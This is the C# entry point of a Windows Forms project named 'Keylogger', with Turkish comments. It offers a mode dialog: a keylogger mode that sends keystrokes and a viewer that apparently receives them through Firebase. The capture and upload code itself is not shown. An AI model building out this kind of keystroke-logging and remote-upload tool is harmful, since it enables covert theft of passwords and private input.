using System;
using System.Windows.Forms;

namespace Keylogger
{
    internal static class Program
    {
        /// <summary>
        /// Uygulamanın ana giriş noktası.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            // Kullanıcıya seçim yaptır
            DialogResult result = MessageBox.Show(
                "Hangi modu kullanmak istiyorsun?\n\n" +
                "EVET = Keylogger (Tuşları gönder)\n" +
                "HAYIR = Viewer (Tuşları al)",
                "Mod Seçimi",
                MessageBoxButtons.YesNo,
                MessageBoxIcon.Question);
            
            if (result == DialogResult.Yes)
            {
                // Keylogger modu
                Application.Run(new MainForm());
            }
            else
            {
                // Viewer modu
                Application.Run(new FirebaseViewer());
            }
        }
    }
}